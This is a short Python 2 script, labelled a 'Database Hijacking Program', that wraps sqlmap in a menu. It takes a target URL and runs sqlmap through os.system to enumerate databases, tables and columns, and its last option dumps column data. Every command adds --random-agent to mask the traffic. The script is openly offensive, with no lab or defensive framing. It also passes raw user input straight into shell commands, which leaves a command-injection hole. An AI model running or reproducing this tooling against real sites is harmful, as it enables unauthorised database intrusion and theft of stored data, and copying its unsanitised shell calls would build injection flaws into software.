#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

print("""
Database Hijacking Program

1) Scan for Vulnerability
2) Scan by Database Name
3) Scan with Database and Table
4) Scan Database and Table and Columns
""")

processno = raw_input("Enter Process no: ")

if(processno == "1"):
	vulnerableURL = raw_input("Enter Url: ")
	os.system("sqlmap -u " + vulnerableURL + " --dbs --random-agent")

elif(processno == "2"):
	vulnerableURL = raw_input("Enter Url: ")
	database = raw_input("Enter Database Name: ")
	os.system("sqlmap -u " + vulnerableURL + " -D " + database + " --tables --random-agent")

elif(processno == "3"):
	vulnerableURL = raw_input("Enter Url: ")
	database = raw_input("Enter Database Name: ")
	table = raw_input("Enter Table Name: ")
	os.system("sqlmap -u " + vulnerableURL + " -D " + database + " -T " + table + " --columns --random-agent")

elif(processno == "4"):
	vulnerableURL = raw_input("Enter Url: ")
	database = raw_input("Enter Database Name: ")
	table = raw_input("Enter Table Name: ")
	colon = raw_input("Enter colon Name: ")
	os.system("sqlmap -u " + vulnerableURL + " -D " + database + " -T " + table + " -C " + colon + " --dump --random-agent")

else:
	print("You Made Mistake!")
